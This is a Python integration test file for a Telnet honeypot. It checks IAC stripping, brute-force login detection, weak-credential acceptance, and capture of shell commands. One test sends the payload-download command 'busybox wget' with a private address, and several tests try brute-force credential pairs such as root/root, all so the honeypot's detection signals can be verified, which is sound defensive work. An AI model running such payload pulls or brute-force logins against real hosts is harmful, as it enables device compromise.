# SPDX-License-Identifier: GPL-3.0-or-later
"""Integration tests: Telnet honeypot captures brute-force credentials + IAC."""
import asyncio
import json
import time
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from lyrebird.events import EventSink  # noqa: E402
from lyrebird.services.telnet import TelnetService, strip_iac  # noqa: E402


def _wait_for_events(log: Path, timeout: float = 10.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if log.exists():
            lines = [l for l in log.read_text().splitlines() if l.strip()]
            if lines:
                return [json.loads(l) for l in lines]
        time.sleep(0.05)
    return []


def _mksvc(tmp_path, **cfg):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    base = {"port": 0, "banner": ""}
    base.update(cfg)
    svc = TelnetService(cfg=base, sink=sink, bind_address="127.0.0.1",
                        data_dir=tmp_path, tls={})
    return svc, sink, log


def test_strip_iac_unit():
    assert strip_iac(b"\xff\xfd\x01root\r\n") == b"root\r\n"   # IAC DO ECHO + root
    assert strip_iac(b"\xff\xff") == b"\xff"                   # escaped IAC
    assert strip_iac(b"ad\xff\xfb\x03min") == b"admin"        # IAC WILL SGA mid-word
    assert strip_iac(b"\xff\xfa\x18\x00x\xff\xf0user") == b"user"  # SB TTYPE ... SE
    assert strip_iac(b"plain\r\n") == b"plain\r\n"
    assert strip_iac(b"root\xff") == b"root"                  # dangling IAC


async def _login(reader, writer, user, password):
    await reader.readuntil(b"login: ")
    writer.write(user + b"\r\n"); await writer.drain()
    await reader.readuntil(b"Password: ")
    writer.write(password + b"\r\n"); await writer.drain()


def test_telnet_bruteforce_deny_then_accept(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=3, bruteforce_threshold=3)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        for u, p in [(b"root", b"x"), (b"admin", b"y"), (b"root", b"root")]:
            await _login(reader, writer, u, p)
        await asyncio.wait_for(reader.readuntil(b"# "), timeout=5)  # accepted → shell prompt
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 3
    assert creds[-1]["request"]["accepted"] is True
    assert creds[0]["request"]["accepted"] is False
    bf = [e for e in events if "telnet-bruteforce" in e.get("tags", [])]
    assert bf, "no telnet-bruteforce signal"
    assert bf[0]["request"]["attempts"] == 3
    assert bf[0]["request"]["accepted"] is True
    assert bf[0]["service"] == "telnet"


def test_telnet_weak_cred_accepted_immediately(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=99, bruteforce_threshold=99,
                            weak_creds=[{"user": "root", "password": "root"}])

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await _login(reader, writer, b"root", b"root")
        await asyncio.wait_for(reader.readuntil(b"# "), timeout=5)  # accepted → shell prompt
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 1
    assert creds[0]["request"]["accepted"] is True
    assert [e for e in events if "telnet-bruteforce" in e.get("tags", [])] == []


def test_telnet_iac_stripped_from_credentials(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=1)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await reader.readuntil(b"login: ")
        writer.write(b"\xff\xfd\x01root\r\n"); await writer.drain()   # IAC DO ECHO + root
        await reader.readuntil(b"Password: ")
        writer.write(b"admin\r\n"); await writer.drain()
        await asyncio.wait_for(reader.readuntil(b"# "), timeout=5)  # accepted → shell prompt
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert creds, "no credentials event"
    assert creds[0]["request"]["user"] == "root"   # IAC bytes stripped
    assert creds[0]["request"]["password"] == "admin"
    # accepted below bruteforce_threshold (attempts=1 < default 3): no signal
    assert [e for e in events if "telnet-bruteforce" in e.get("tags", [])] == []


def test_telnet_shell_captures_commands_and_payload_pull(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=1, bruteforce_threshold=99)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await _login(reader, writer, b"root", b"root")     # accepted (accept_after=1)
        await reader.readuntil(b"# ")                       # shell prompt
        writer.write(b"busybox wget http://10.0.0.9/m\r\n"); await writer.drain()
        await reader.readuntil(b"# ")                       # canned output + next prompt
        writer.write(b"exit\r\n"); await writer.drain()
        await asyncio.wait_for(reader.read(), timeout=5)  # wait for server to close (handler done)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    pull = [e for e in events if "telnet-payload-pull" in e.get("tags", [])]
    assert pull, "no telnet-payload-pull signal"
    assert pull[0]["request"]["tool"] == "wget"
    assert pull[0]["request"]["url"] == "http://10.0.0.9/m"
    assert pull[0]["service"] == "telnet"


def test_telnet_bruteforce_fires_on_failed_disconnect(tmp_path):
    # A brute-force that never guesses right and hangs up must STILL fire
    # telnet-bruteforce (accepted False) — the failed cred-list run is the tell.
    svc, sink, log = _mksvc(tmp_path, accept_after=99, bruteforce_threshold=3)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        for u, p in [(b"root", b"1"), (b"admin", b"2"), (b"root", b"3")]:
            await _login(reader, writer, u, p)
        writer.write_eof()                  # hang up (EOF) without ever succeeding
        # read until the server closes its side — this deterministically waits
        # for the handler to run through the telnet-bruteforce emit + close,
        # rather than racing asyncio.run()'s loop teardown.
        await asyncio.wait_for(reader.read(), timeout=5)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    bf = [e for e in events if "telnet-bruteforce" in e.get("tags", [])]
    assert bf, "telnet-bruteforce not fired on a failed brute-force"
    assert bf[0]["request"]["attempts"] == 3
    assert bf[0]["request"]["accepted"] is False
    assert not [e for e in events if e.get("request", {}).get("command")]  # no shell


def test_telnet_bruteforce_fires_on_abrupt_reset(tmp_path):
    # An abortive RST close (network drop / killed sample) after crossing the
    # threshold raises ConnectionResetError in the handler — the signal must
    # still fire, from `finally`.
    import socket
    import struct
    svc, sink, log = _mksvc(tmp_path, accept_after=99, bruteforce_threshold=3)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        for u, p in [(b"root", b"1"), (b"admin", b"2"), (b"root", b"3")]:
            await _login(reader, writer, u, p)
        sock = writer.get_extra_info("socket")
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        writer.close()                       # RST, not a clean FIN
        try:
            await writer.wait_closed()
        except Exception:
            pass
        # poll the CONDITION (not a fixed sleep) so the handler observes the RST
        # and emits from finally before the loop tears down.
        for _ in range(300):
            if log.exists() and "telnet-bruteforce" in log.read_text():
                break
            await asyncio.sleep(0.01)
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    bf = [e for e in events if "telnet-bruteforce" in e.get("tags", [])]
    assert bf, "telnet-bruteforce not fired on an abrupt RST disconnect"
    assert bf[0]["request"]["attempts"] == 3
    assert bf[0]["request"]["accepted"] is False
